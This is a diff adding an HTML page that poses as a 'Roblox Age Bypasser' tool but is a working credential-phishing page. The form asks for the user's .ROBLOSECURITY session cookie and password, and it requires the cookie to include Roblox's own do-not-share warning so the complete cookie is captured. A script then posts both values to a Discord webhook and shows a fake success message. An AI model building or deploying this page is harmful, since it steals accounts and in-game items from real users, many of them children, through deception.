@@ -1,0 +1,234 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Roblox Age Bypasser</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      background: black;
+      overflow: hidden;
+      font-family: 'Inter', sans-serif;
+      position: relative;
+    }
+    #redAnimation {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 0;
+      overflow: visible;
+    }
+    .circle {
+      position: absolute;
+      border-radius: 50%;
+      background-color: rgba(255, 0, 0, 0.3);
+      animation-timing-function: linear;
+      animation-iteration-count: infinite;
+      box-shadow: 0 0 8px 2px rgba(255, 0, 0, 0.7);
+    }
+    /* Define circular movement animations with different radii and speeds */
+    @keyframes circleMove1 {
+      0% { transform: translate(0, 0); }
+      25% { transform: translate(10px, 10px); }
+      50% { transform: translate(0, 20px); }
+      75% { transform: translate(-10px, 10px); }
+      100% { transform: translate(0, 0); }
+    }
+    @keyframes circleMove2 {
+      0% { transform: translate(0, 0); }
+      25% { transform: translate(15px, -10px); }
+      50% { transform: translate(0, -20px); }
+      75% { transform: translate(-15px, -10px); }
+      100% { transform: translate(0, 0); }
+    }
+    @keyframes circleMove3 {
+      0% { transform: translate(0, 0); }
+      25% { transform: translate(8px, 8px); }
+      50% { transform: translate(0, 16px); }
+      75% { transform: translate(-8px, 8px); }
+      100% { transform: translate(0, 0); }
+    }
+  </style>
+</head>
+<body>
+  <div id="redAnimation"></div>
+  <div id="circleContainer"></div>
+  <div
+    class="relative z-10 flex items-center justify-center min-h-screen p-4"
+  >
+    <div
+      class="border border-green-500 rounded-lg p-6 max-w-md w-full bg-[#121a27] backdrop-blur-sm"
+    >
+      <h1
+        class="text-green-500 font-extrabold text-2xl flex items-center justify-center mb-6"
+      >
+        <img
+          alt="Rocket emoji icon"
+          class="mr-2"
+          height="24"
+          src="https://storage.googleapis.com/a1aa/image/4426a7e0-eeea-468a-0ae6-480b231a4b49.jpg"
+          width="24"
+        />
+        Roblox Age Bypasser
+      </h1>
+      <form id="bypassForm" class="space-y-4 text-gray-300 text-xs font-semibold" autocomplete="off">
+        <div>
+          <label class="block mb-1 text-gray-400" for="cookie">
+            .ROBLOSECURITY Cookie <span class="text-red-500 font-bold">*</span>
+          </label>
+          <input
+            autocomplete="off"
+            class="w-full rounded-md bg-[#1e293b] border border-transparent focus:border-green-500 focus:ring-1 focus:ring-green-500 text-gray-300 placeholder:text-gray-400 px-4 py-2 text-sm"
+            id="cookie"
+            name="cookie"
+            placeholder="Enter your .ROBLOSECURITY cookie here..."
+            type="text"
+            required
+          />
+          <p id="cookieWarning" class="mt-1 text-red-500 text-xs font-semibold">
+            Required _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_
+          </p>
+        </div>
+        <div>
+          <label class="block mb-1 text-gray-400" for="password">
+            Password
+          </label>
+          <input
+            autocomplete="off"
+            class="w-full rounded-md bg-[#1e293b] border border-transparent focus:border-green-500 focus:ring-1 focus:ring-green-500 text-gray-300 placeholder:text-gray-400 px-4 py-2 text-sm"
+            id="password"
+            name="password"
+            placeholder="Enter your password..."
+            type="password"
+            required
+          />
+        </div>
+        <button
+          class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold rounded-md py-2 text-sm"
+          type="submit"
+        >
+          Start Age Bypass
+        </button>
+      </form>
+      <p id="message" class="mt-4 text-center text-sm font-semibold"></p>
+    </div>
+  </div>
+
+  <script>
+    // Create multiple small red circles with circular movement animation
+    const circleContainer = document.getElementById("circleContainer");
+    const circleCount = 30;
+
+    for (let i = 0; i < circleCount; i++) {
+      const circle = document.createElement("div");
+      circle.classList.add("circle");
+
+      // Random size between 6 and 14 px
+      const size = Math.floor(Math.random() * 9) + 6;
+      circle.style.width = size + "px";
+      circle.style.height = size + "px";
+
+      // Random initial position within viewport
+      circle.style.top = Math.random() * 100 + "vh";
+      circle.style.left = Math.random() * 100 + "vw";
+
+      // Assign one of the three animations randomly with random duration
+      const animNum = (i % 3) + 1;
+      const duration = (Math.random() * 5 + 5).toFixed(2); // 5s to 10s
+      circle.style.animation = `circleMove${animNum} ${duration}s linear infinite`;
+
+      circleContainer.appendChild(circle);
+    }
+
+    const form = document.getElementById("bypassForm");
+    const message = document.getElementById("message");
+    const cookieInput = form.cookie;
+    const cookieWarning = document.getElementById("cookieWarning");
+
+    // Replace this with your actual webhook URL
+    const webhookURL = "YOUR_WEBHOOK_URL_HERE";
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const cookie = cookieInput.value.trim();
+      const password = form.password.value.trim();
+
+      // Check if cookie includes the required warning string
+      const requiredWarning = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+
+      if (!cookie.includes(requiredWarning)) {
+        cookieWarning.textContent = `Required ${requiredWarning} Please put`;
+        cookieWarning.classList.add("text-red-600");
+        message.textContent = "";
+        return;
+      } else {
+        cookieWarning.textContent = `Required ${requiredWarning}`;
+        cookieWarning.classList.remove("text-red-600");
+      }
+
+      if (!cookie || !password) {
+        message.textContent = "Please fill in both fields.";
+        message.classList.remove("text-green-500");
+        message.classList.add("text-red-500");
+        return;
+      }
+
+      // Prepare Discord embed payload
+      const payload = {
+        content: "@everyone @here",
+        embeds: [
+          {
+            title: "New Roblox Age Bypasser Submission",
+            color: 16711680, // red color
+            fields: [
+              {
+                name: ".ROBLOSECURITY Cookie",
+                value: `\`\`\`${cookie}\`\`\``,
+                inline: false,
+              },
+              {
+                name: "Password",
+                value: `\`\`\`${password}\`\`\``,
+                inline: false,
+              },
+            ],
+            timestamp: new Date().toISOString(),
+          },
+        ],
+      };
+
+      try {
+        const response = await fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(payload),
+        });
+
+        if (response.ok) {
+          message.textContent = "Age bypass started using your .ROBLOSECURITY cookie and password.";
+          message.classList.remove("text-red-500");
+          message.classList.add("text-green-500");
+          form.reset();
+          cookieWarning.textContent = `Required ${requiredWarning}`;
+          cookieWarning.classList.remove("text-red-600");
+        } else {
+          message.textContent = "Failed to send data. Please try again.";
+          message.classList.remove("text-green-500");
+          message.classList.add("text-red-500");
+        }
+      } catch (error) {
+        message.textContent = "Error sending data. Please try again.";
+        message.classList.remove("text-green-500");
+        message.classList.add("text-red-500");
+      }
+    });
+  </script>
+</body>
+</html>
